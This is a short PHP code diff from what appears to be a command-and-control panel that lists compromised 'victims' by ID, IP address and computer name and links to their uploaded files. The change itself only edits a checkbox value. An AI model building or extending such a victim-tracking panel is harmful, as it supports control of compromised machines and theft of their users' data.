@@ -116,7 +116,7 @@ $allClients = $client->getClients();
                   <tbody>
                     <?php foreach ($allClients as $clientData): ?>
                     <tr>
-                     <td><input type="checkbox" id="client[]" name="client[]" value="<?php echo "'" . $clientData->vicid . "'"; ?>"></td>
+                     <td><input type="checkbox" id="client[]" name="client[]" value="<?php echo $clientData->vicid; ?>"></td>
                      <td><a href="viewuploads.php?vicid=<?php echo $clientData->vicid ?>"><?php echo $clientData->vicid; ?></a></td>
                      <td><?php echo $clientData->ipaddress; ?></td>
                      <td><?php echo $clientData->computername; ?></td>
